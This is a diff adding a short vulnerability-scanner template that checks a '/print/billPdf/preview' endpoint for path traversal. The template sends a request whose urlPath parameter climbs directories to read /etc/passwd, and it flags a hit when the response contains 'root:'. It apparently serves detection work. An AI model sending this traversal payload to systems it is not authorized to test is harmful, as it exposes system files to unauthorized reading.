@@ -1,0 +1,23 @@
+id: preview-read-file
+
+info:
+  name: preview-read-file
+  author: deltezer0
+  severity: medium
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "root:"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
